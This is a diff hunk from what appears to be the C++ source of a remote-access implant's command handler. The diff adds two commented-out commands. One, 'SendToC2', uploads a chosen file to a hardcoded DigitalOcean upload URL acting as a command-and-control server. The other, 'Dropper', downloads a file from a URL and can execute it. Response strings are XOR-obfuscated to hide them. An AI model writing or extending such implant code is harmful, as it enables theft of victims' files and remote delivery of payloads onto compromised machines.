@@ -137,6 +137,69 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
             exit(0);
             abort();
         }
+
+
+    /* Send Files To C2
+    if(command.compare("SendToC2") == 0){
+            std::istringstream ss(args);
+			std::string path;
+			std::string filename;
+			ss >> path;
+			ss >> filename;
+        try{
+            // Add in Command for Post.cpp 
+            sendToC2(path,"https://sea-lion-app-f5nrq.ondigitalocean.app/upload_files", filename, std::to_string(task_id), std::to_string(implant_id));
+        }
+        catch(...){
+            HttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
+            work = xor_string("fG",0x28);
+        }
+        if(work.compare(xor_string("fG",0x28)) == 1){
+            HttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, "success", command);
+        }
+
+    }
+    */
+   /*
+    if (command.compare("Dropper") == 0){
+        try {
+            std::string arg1;
+            std::string arg2;
+            bool arg3=true;
+            int arg=0;
+            for(int x=0;x<command.length();x++){
+                if(command[x]==(' ')){
+                    if(arg == 0){
+                        arg1= command.substr(0,x+1);
+                        arg=x+1;
+                    }
+                    else{
+                        arg2=command.substr(arg,x-arg);
+                        if(command[command.length()-1]=='1'){
+                            arg3=false;
+
+                        }
+                            
+                        break;
+                    }
+                }
+                    
+            }
+            dropToPath(arg1,arg2,arg3);
+
+            
+            //dropToPath(std::string url, std::string filePath, bool execute);
+
+        } catch(...){
+            HttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
+            work = xor_string("fG",0x28);
+        }
+        if(work.compare(xor_string("fG",0x28)) == 1){
+            HttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, "success", command);
+        }
+    }
+        */
+    
     return;
 }
 
